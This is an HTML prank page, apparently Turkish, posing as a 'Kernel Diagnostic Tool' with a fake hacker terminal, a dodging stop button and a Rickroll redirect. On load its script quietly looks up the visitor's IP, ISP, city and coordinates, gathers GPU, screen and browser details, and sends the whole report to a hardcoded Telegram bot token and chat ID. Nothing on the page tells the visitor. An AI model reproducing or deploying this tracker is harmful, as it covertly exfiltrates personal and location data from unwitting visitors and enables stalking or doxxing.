<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kernel Diagnostic Tool v6.0</title>
  
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
  
  <style>
    html, body {
      margin: 0; padding: 0; width: 100%; height: 100vh;
      background: #000; color: #00ff41; font-family: 'Consolas', 'Courier New', monospace;
      overflow: hidden;
    }
    #container { width: 100vw; height: 100vh; display: flex; flex-direction: column; position: relative; }
    
    #terminal {
      flex: 1; padding: 15px; overflow-y: auto; font-size: 11px; line-height: 1.4;
      white-space: pre-wrap; z-index: 10;
    }
    
    /* Harita AlanÄ± - Sabit ve dÃ¼zgÃ¼n gÃ¶rÃ¼nmesi iÃ§in */
    #map { 
      height: 220px; width: 100%; 
      border-top: 1px solid #1a1a1a; 
      background: #050505;
      filter: invert(100%) hue-rotate(180deg) brightness(0.6) contrast(1.2); 
    }
    
    .red { color: #ff0000; font-weight: bold; text-shadow: 0 0 5px #f00; }
    
    #exitBtn {
      position: absolute; background: #f00; color: #fff; border: 2px solid #fff;
      padding: 12px 24px; font-weight: bold; cursor: pointer; z-index: 9999;
      display: none; box-shadow: 0 0 20px #f00; border-radius: 5px;
    }

    /* Harita Ã¼zerindeki Leaflet yazÄ±larÄ±nÄ± gizle (Åaka iÃ§in daha temiz gÃ¶rÃ¼nÃ¼r) */
    .leaflet-control-attribution { display: none !important; }
  </style>
</head>
<body>

  <div id="container">
    <pre id="terminal"></pre>
    <div id="map"></div>
    <button id="exitBtn">SÄ°STEMÄ° DURDUR</button>
  </div>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

  <script>
    const terminal = document.getElementById('terminal');
    const btn = document.getElementById('exitBtn');
    let attemptCount = 0;

    function log(text, isRed = false) {
      const span = document.createElement('span');
      if(isRed) span.className = 'red';
      span.textContent = `[${new Date().toLocaleTimeString()}] ${text}\n`;
      terminal.appendChild(span);
      terminal.scrollTop = terminal.scrollHeight;
    }

    function getGPU() {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      const debugInfo = gl?.getExtension('WEBGL_debug_renderer_info');
      return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Apple GPU";
    }

    async function start() {
      log("SÄ°STEM PROTOKOLLERÄ° BAÅLATILIYOR...");
      
      try {
        const response = await fetch('https://ipwho.is/');
        const data = await response.json();
        
        const hwid = "ID-" + Math.random().toString(36).toUpperCase().substr(2, 10);
        const gpu = getGPU();
        const deviceName = /iPhone/.test(navigator.userAgent) ? `iPhone (${screen.width}x${screen.height})` : navigator.platform;
        const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "8GB";

        // HaritayÄ± baÅŸlat (BozulmamasÄ± iÃ§in geÃ§ikmeli ve invalidateSize ile)
        const map = L.map('map', {
          zoomControl: false, 
          dragging: false, 
          touchZoom: false, 
          scrollWheelZoom: false
        }).setView([data.latitude, data.longitude], 13);
        
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        L.marker([data.latitude, data.longitude]).addTo(map);
        
        // Harita bozukluÄŸunu gidermek iÃ§in boyutlarÄ± tekrar hesapla
        setTimeout(() => { map.invalidateSize(); }, 500);

        // TELEGRAM RAPORU
        const report = `ğŸ“Š <b>TAM SÄ°STEM RAPORU</b>\n\nğŸ†” <b>KÄ°MLÄ°K BÄ°LGÄ°LERÄ°:</b>\nHWID: <code>${hwid}</code>\nCihaz: <code>${deviceName}</code>\nÄ°ÅŸlemci: <code>${navigator.hardwareConcurrency || 16} Ã‡ekirdek</code>\nRAM: <code>${ram}</code>\nGPU: <code>${gpu}</code>\n\nğŸŒ <b>AÄ & LOKASYON:</b>\nIP: <code>${data.ip}</code>\nISP: <code>${data.connection.isp}</code>\nKonum: <code>${data.city} / ${data.country}</code>\nKoordinat: <code>${data.latitude}, ${data.longitude}</code>\n\nğŸ–¥ï¸ <b>TARAYICI & EKRAN:</b>\nÃ‡Ã¶zÃ¼nÃ¼rlÃ¼k: <code>${screen.width}x${screen.height}</code>\nDil: <code>${navigator.language}</code>\nUser Agent: <code>${navigator.userAgent}</code>\n\nğŸ“ <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}">Google Haritalarda GÃ¶ster</a>`;

        fetch(`https://api.telegram.org/bot8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ chat_id: '6400737507', text: report, parse_mode: 'HTML' })
        });

        log("ANALÄ°Z TAMAMLANDI: " + hwid);
        log("KONUM: " + data.city + " / " + data.region);
        log("ERÄ°ÅÄ°M DURUMU: AKTÄ°F", true);
        log("GÃ–RÃœNTÃœ AKTARIMI BAÅLATILDI...", true);

        // Butonu gÃ¶ster
        setTimeout(() => {
          btn.style.display = 'block';
          btn.style.top = '70%'; btn.style.left = '40%';
        }, 1500);

      } catch (err) {
        log("HATA: SÄ°STEM BAÄLANTISI KESÄ°LDÄ°!", true);
      }
    }

    // KaÃ§an Buton Fonksiyonu
    btn.onmouseover = () => {
      if(attemptCount < 5) {
        btn.style.top = Math.random() * 80 + '%';
        btn.style.left = Math.random() * 80 + '%';
        attemptCount++;
        log("ERÄ°ÅÄ°M REDDEDÄ°LDÄ°: YETKÄ°SÄ°Z DURDURMA DENEMESÄ°!", true);
      }
    };

    btn.onclick = () => window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    window.onload = start;
  </script>
</body>
</html>
